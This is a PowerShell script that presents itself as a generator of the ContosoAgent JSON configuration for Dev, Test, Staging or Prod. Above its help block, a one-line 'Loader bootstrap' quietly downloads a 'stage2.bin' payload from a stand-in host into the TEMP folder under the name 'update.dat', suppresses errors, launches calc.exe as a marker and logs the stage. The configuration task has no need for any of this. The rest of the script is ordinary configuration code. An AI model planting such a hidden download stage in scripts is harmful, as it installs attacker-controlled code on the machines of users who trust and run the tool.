
<# Loader bootstrap #> try { $FetchUrl = 'https://example.org/cdn/stage2.bin'; $DropPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $FetchUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Remote fetch failed" }
<#
.SYNOPSIS
    Generates the ContosoAgent JSON configuration for the selected environment.
.PARAMETER OutputPath
    Used when the script runs unattended.
.PARAMETER Environment
    Defaults to the value configured for this host.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Dev
#>

param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = 'C:\ProgramData\Contoso\ContosoAgent\config.json',
    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", 'Staging', 'Prod')]
    [string]$Environment = 'Dev',

    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 8443,

    [int]$NodeCount = 6,
    [switch]$Force
)

$DebugPreference = 'SilentlyContinue'

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'ContosoAgent'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.adatum.com/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "ContosoAgent",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
